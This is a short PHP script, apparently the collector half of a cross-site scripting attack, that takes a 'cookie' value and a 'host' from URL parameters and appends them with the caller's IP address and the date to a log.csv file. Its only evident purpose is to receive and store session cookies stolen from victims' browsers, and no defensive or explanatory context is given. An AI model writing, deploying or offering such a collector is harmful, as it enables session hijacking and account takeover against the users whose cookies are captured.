<?php

$cookie = $_GET['cookie'];
$url = $_GET['host'];
$ip=$_SERVER['REMOTE_ADDR'];
$time = date("Y-m-d",time()); 
$text = $time.",".$ip.",".$url.",".$cookie."\n";

$myfile = fopen("log.csv", "a") or die("Unable to open file!");

fwrite($myfile, $text);
fclose($myfile);

?>
